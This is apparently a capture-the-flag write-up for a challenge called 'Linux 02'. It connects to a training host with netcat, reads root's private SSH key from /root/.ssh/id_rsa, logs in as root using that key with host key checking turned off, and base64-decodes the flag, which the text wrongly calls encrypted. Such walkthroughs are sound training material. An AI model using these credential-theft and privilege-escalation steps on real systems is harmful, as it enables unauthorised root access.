## Linux 02

> Can you capture the flag? Execute the following command to obtain a reverse shell on your local machine.

```bash
$ nc 192.168.10.7 9999

Where am I?
```
This command give us access with a reverse shell yo the machine with `ip 192.168.10.7`

The first command executed was ls you can see a directory called ytdl I had a look in there and I couldn´t find nothing special.
So I moved around the directories and found out that the directory `/root` has a readable hidden directory `.ssh` which store the followings files:
* `authorized_keys` Specifies the SSH keys that can be used for logging into the user account for which the file is configured
* `id_rsa` Here is stored the private key of the machine
* `id_rsa.pub` Here is stored the public key of the machine
As u can use ``` $cat id_rsa ``` and you can read the private key, we have two options:
1. Copy this key to our machine
2. Use this key locally to connect as root
The optimal option is to connect locally via `ssh` to the machine so we use. We will use 2>&1 to have the error message printed.
```bash 
$ ssh root@localmachine -i /root/.ssh/id_rsa 2>&1
```
This is not enough to connect to the machine, we have the problem that the host cant allow us to connect becouse we are not in the known host list
we can jump throw this control by using the flag `-o StrictHostKeyChecking=no` now the command is this.

```bash 
$ ssh root@localmachine -i /root/.ssh/id_rsa -o StrictHostKeyChecking=no

Y3liZXJjdGZkezFuZDMzZF93aDNyM193NDVfMX0=

```
This message is encrypted so we now need to decrypt it.

```bash 
$ echo "Y3liZXJjdGZkezFuZDMzZF93aDNyM193NDVfMX0=" | base64 -d
cyberctfd{1nd33d_wh3r3_w45_1}
```
